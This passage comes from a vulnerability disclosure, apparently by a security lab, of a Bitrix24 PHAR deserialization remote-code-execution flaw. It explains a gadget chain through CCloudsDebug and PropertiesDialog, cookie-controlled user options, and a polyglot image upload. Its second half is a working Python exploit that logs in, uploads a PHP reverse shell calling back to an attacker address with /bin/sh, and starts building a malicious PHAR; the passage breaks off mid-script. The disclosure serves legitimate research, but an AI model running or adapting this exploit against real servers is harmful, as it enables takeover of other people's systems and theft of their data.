<p>As the second check only involves <code>$path[1]</code> and <code>$filePath</code>, modification of <code>$path[0]</code> will not result in the check failing.</p>
<p>Therefore, an attacker can use the <code>PropertiesDialog</code> class to include arbitrary files.</p>
<p>There are several classes that would trigger the <code>__toString</code> method of <code>PropertiesDialog</code> when they are destructed. One such class is <code>CCloudsDebug</code>, found in <code>bitrix/modules/clouds/include.php</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// line 39 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">class</span> <span class="nc">CCloudsDebug</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="k">static</span> <span class="nv">$instances</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">getInstance</span><span class="p">(</span><span class="nv">$action</span> <span class="o">=</span> <span class="s2">&#34;counters&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$head</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$id</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$action</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$cloudsKey</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">head</span><span class="o">.</span><span class="s2">&#34;|&#34;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">id</span><span class="o">.</span><span class="s2">&#34;|mess&#34;</span><span class="p">;</span> <span class="c1">// [8]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$prevTrace</span> <span class="o">=</span> <span class="nx">apcu_fetch</span><span class="p">(</span><span class="nv">$cloudsKey</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$prevTrace</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nx">AddMessage2Log</span><span class="p">(</span><span class="nv">$prevTrace</span><span class="p">,</span> <span class="s2">&#34;clouds&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">apcu_delete</span><span class="p">(</span><span class="nv">$cloudsKey</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">apcu_delete</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">head</span><span class="o">.</span><span class="s2">&#34;|&#34;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span></code></pre></div><p>At <code>[8]</code>, the <code>head</code> property is concatenated with a string. This causes the <code>__toString</code> method of <code>$this-&gt;head</code> to be called. Thus, an attacker could trigger the arbitrary file include detailed above by setting <code>$this-&gt;head</code> to a specially constructed <code>PropertiesDialog</code> object.</p>
<p>Finally, an attacker requires a method to upload the malicious PHAR file to the server. This method would also have to disclose the path of the PHAR file on the server.</p>
<p>It was discovered that an authenticated attacker could upload images via changing the profile picture of a CRM contact. The endpoint used for this process (<code>/bitrix/components/bitrix/main.file.input/ajax.php</code>) discloses the path of the uploaded image. A PHAR/JPG polyglot (based on code by <code>kunte0</code> found <a href="https://github.com/kunte0/phar-jpg-polyglot">here</a>) was used to pass checks on the validity of the uploaded image.</p>
<h4 id="attacker-controlled-user-options-1">Attacker-controlled User Options<a hidden class="anchor" aria-hidden="true" href="#attacker-controlled-user-options-1">#</a></h4>
<p>The root cause of this vulnerability is the incorrect assumption that the return value of <code>CUserOptions::GetOption</code> cannot be arbitrarily controlled by an attacker. However, there are several ways to do so. In this section, we will examine one of them.</p>
<p>The <code>CUserOptions::SetOptionsFromArray</code> function found in <code>bitrix/modules/main/classes/general/user_options.php</code> lines 216 to 243 can be used to set any user option.</p>
<p>This function is called by <code>CUserOptions::SetCookieOptions</code>, shown below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// bitrix/modules/main/classes/general/user_options.php lines 317 to 329
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">SetCookieOptions</span><span class="p">(</span><span class="nv">$cookieName</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//last user setting
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$varCookie</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nx">parse_str</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="nv">$cookieName</span><span class="p">],</span> <span class="nv">$varCookie</span><span class="p">);</span> <span class="c1">// [9]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">setcookie</span><span class="p">(</span><span class="nv">$cookieName</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="s2">&#34;/&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$varCookie</span><span class="p">[</span><span class="s2">&#34;p&#34;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$varCookie</span><span class="p">[</span><span class="s2">&#34;sessid&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="nx">bitrix_sessid</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$arOptions</span> <span class="o">=</span> <span class="nv">$varCookie</span><span class="p">[</span><span class="s2">&#34;p&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nx">CUtil</span><span class="o">::</span><span class="na">decodeURIComponent</span><span class="p">(</span><span class="nv">$arOptions</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">CUserOptions</span><span class="o">::</span><span class="na">SetOptionsFromArray</span><span class="p">(</span><span class="nv">$arOptions</span><span class="p">);</span> <span class="c1">// [10]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>This function retrieves the user options from a user supplied cookie at <code>[9]</code>, parses it as a query string, then calls <code>CUserOptions::SetOptionsFromArray</code> on the result at <code>[10]</code>.</p>
<p>The <code>CUserOptions::SetCookieOptions</code> function is in turn called by the <code>CAllMain::PrologActions</code> function, if the <code>$cookieName</code> cookie is set. The default cookie name is <code>BITRIX_SM_LAST_SETTINGS</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">PrologActions</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
</span></span><span class="line"><span class="cl">    <span class="c1">// bitrix/modules/main/classes/general/main.php lines 3497 to 3501
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$cookieName</span> <span class="o">=</span> <span class="nx">COption</span><span class="o">::</span><span class="na">GetOptionString</span><span class="p">(</span><span class="s2">&#34;main&#34;</span><span class="p">,</span> <span class="s2">&#34;cookie_name&#34;</span><span class="p">,</span> <span class="s2">&#34;BITRIX_SM&#34;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;_LAST_SETTINGS&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="nv">$cookieName</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">CUserOptions</span><span class="o">::</span><span class="na">SetCookieOptions</span><span class="p">(</span><span class="nv">$cookieName</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span></code></pre></div><p>The <code>CAllMain::PrologActions</code> function is called in <code>bitrix/modules/main/include/prolog_before.php</code> which is included in nearly every Bitrix24 route. Therefore, by setting the <code>BITRIX_SM_LAST_SETTINGS</code> cookie, an attacker can easily manipulate their own user options.</p>
<h3 id="proof-of-concept-1">Proof-of-Concept:<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept-1">#</a></h3>
<p>We have tried our best to make the PoC as portable as possible. This report includes a functional exploit written in Python3 that exploits the PHAR deserialization vulnerability and opens a reverse shell connection to the victim web server.</p>
<p>A sample exploit script is shown below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Bitrix24 PHAR Deserialization RCE (CVE-2023-XXXXX)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Via: https://TARGET_HOST/bitrix/components/bitrix/crm.contact.list/stexport.ajax.php</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Author: Lam Jun Rong (STAR Labs SG Pte. Ltd.)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">typing</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">HOST</span> <span class="o">=</span> <span class="s2">&#34;http://localhost:8000&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">SITE_ID</span> <span class="o">=</span> <span class="s2">&#34;s1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">USERNAME</span> <span class="o">=</span> <span class="s2">&#34;crm_only&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">PASSWORD</span> <span class="o">=</span> <span class="s2">&#34;crm_only&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ROOT_PATH</span> <span class="o">=</span> <span class="s2">&#34;/var/www/html/&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">PORT</span> <span class="o">=</span> <span class="mi">9001</span>
</span></span><span class="line"><span class="cl"><span class="n">LHOST</span> <span class="o">=</span> <span class="s2">&#34;192.168.86.125&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">PROXY</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;http&#34;</span><span class="p">:</span> <span class="s2">&#34;http://localhost:8080&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">nested_to_urlencoded</span><span class="p">(</span><span class="n">val</span><span class="p">:</span> <span class="n">typing</span><span class="o">.</span><span class="n">Any</span><span class="p">,</span> <span class="n">prefix</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">val</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">val</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">            <span class="n">child</span> <span class="o">=</span> <span class="n">nested_to_urlencoded</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">prefix</span><span class="o">=</span><span class="p">(</span><span class="n">k</span> <span class="k">if</span> <span class="n">prefix</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span> <span class="k">else</span> <span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s2">]&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="n">child</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">                <span class="n">out</span><span class="p">[</span><span class="n">prefix</span> <span class="o">+</span> <span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="nb">type</span><span class="p">(</span><span class="n">val</span><span class="p">)</span> <span class="ow">in</span> <span class="p">[</span><span class="nb">list</span><span class="p">,</span> <span class="nb">tuple</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">item</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">val</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">child</span> <span class="o">=</span> <span class="n">nested_to_urlencoded</span><span class="p">(</span><span class="n">item</span><span class="p">,</span> <span class="n">prefix</span><span class="o">=</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">]&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="n">child</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">                <span class="n">out</span><span class="p">[</span><span class="n">prefix</span> <span class="o">+</span> <span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">out</span><span class="p">[</span><span class="n">prefix</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">out</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dict_to_str</span><span class="p">(</span><span class="n">d</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;&amp;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s2">=</span><span class="si">{</span><span class="n">v</span><span class="si">}</span><span class="s2">&#34;</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">d</span><span class="o">.</span><span class="n">items</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check_creds</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">sessid</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">HOST</span> <span class="o">+</span> <span class="s2">&#34;/bitrix/tools/public_session.php&#34;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;X-Bitrix-Csrf-Token&#34;</span><span class="p">:</span> <span class="n">sessid</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;PHPSESSID&#34;</span><span class="p">:</span> <span class="n">cookie</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="n">proxies</span><span class="o">=</span><span class="n">PROXY</span><span class="p">)</span><span class="o">.</span><span class="n">text</span> <span class="o">==</span> <span class="s2">&#34;OK&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="s2">&#34;./cached-creds.txt&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">cookie</span><span class="p">,</span> <span class="n">sessid</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./cached-creds.txt&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">check_creds</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">sessid</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s2">&#34;PHPSESSID&#34;</span><span class="p">,</span> <span class="n">cookie</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Using cached credentials&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">sessid</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] Cached credentials are invalid&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">HOST</span> <span class="o">+</span> <span class="s2">&#34;/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">HOST</span> <span class="o">+</span> <span class="s2">&#34;/?login=yes&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;AUTH_FORM&#34;</span><span class="p">:</span> <span class="s2">&#34;Y&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;TYPE&#34;</span><span class="p">:</span> <span class="s2">&#34;AUTH&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;backurl&#34;</span><span class="p">:</span> <span class="s2">&#34;/&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;USER_LOGIN&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;USER_PASSWORD&#34;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;BITRIX_SM_LOGIN&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[!] Invalid credentials&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">sessid</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s2">&#34;&#39;bitrix_sessid&#39;:&#39;([a-f0-9]</span><span class="si">{32}</span><span class="s2">)&#39;&#34;</span><span class="p">),</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Logged in as </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./cached-creds.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">sessid</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">sessid</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">upload_web_shell</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">sessid</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;?php 
</span></span></span><span class="line"><span class="cl"><span class="s2">    sleep(2);
</span></span></span><span class="line"><span class="cl"><span class="s2">    $sock=fsockopen(&#34;</span><span class="si">{</span><span class="n">LHOST</span><span class="si">}</span><span class="s2">&#34;, </span><span class="si">{</span><span class="n">PORT</span><span class="si">}</span><span class="s2">);
</span></span></span><span class="line"><span class="cl"><span class="s2">    $proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">upload</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">sessid</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">upload</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">sessid</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">CID</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">pow</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">5</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">HOST</span> <span class="o">+</span> <span class="s2">&#34;/desktop_app/file.ajax.php?action=uploadfile&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;X-Bitrix-Csrf-Token&#34;</span><span class="p">:</span> <span class="n">sessid</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;X-Bitrix-Site-Id&#34;</span><span class="p">:</span> <span class="n">SITE_ID</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bxu_info[mode]&#34;</span><span class="p">:</span> <span class="s2">&#34;upload&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bxu_info[CID]&#34;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">CID</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bxu_info[filesCount]&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bxu_info[packageIndex]&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;pIndex</span><span class="si">{</span><span class="n">CID</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bxu_info[NAME]&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;file</span><span class="si">{</span><span class="n">CID</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bxu_files[0][name]&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;file</span><span class="si">{</span><span class="n">CID</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="n">files</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bxu_files[0][default]&#34;</span><span class="p">:</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;file&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">data</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;text/plain&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="n">proxies</span><span class="o">=</span><span class="n">PROXY</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">resp</span><span class="p">[</span><span class="s2">&#34;files&#34;</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;files&#34;</span><span class="p">][</span><span class="s2">&#34;default&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">make_phar</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;rm ./test.phar&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Creating PHAR&#34;</span><span class="p">)</span>
